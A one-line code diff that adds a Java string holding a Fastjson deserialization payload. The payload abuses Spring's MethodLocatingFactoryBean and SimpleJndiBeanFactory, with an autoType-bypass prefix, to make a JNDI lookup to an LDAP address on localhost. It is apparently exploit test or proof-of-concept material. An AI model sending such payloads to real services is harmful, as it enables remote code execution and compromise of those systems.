@@ -1,0 +1,1 @@
+String exp = "{\"@type\":\"Lorg.springframework.aop.config.MethodLocatingFactoryBean;\",\"methodName\":\"sssss\",\"targetBeanName\":\"ldap://127.0.0.1:8990/exp\",\"beanFactory\":{\"@type\":\"Lorg.springframework.jndi.support.SimpleJndiBeanFactory;\"}}";
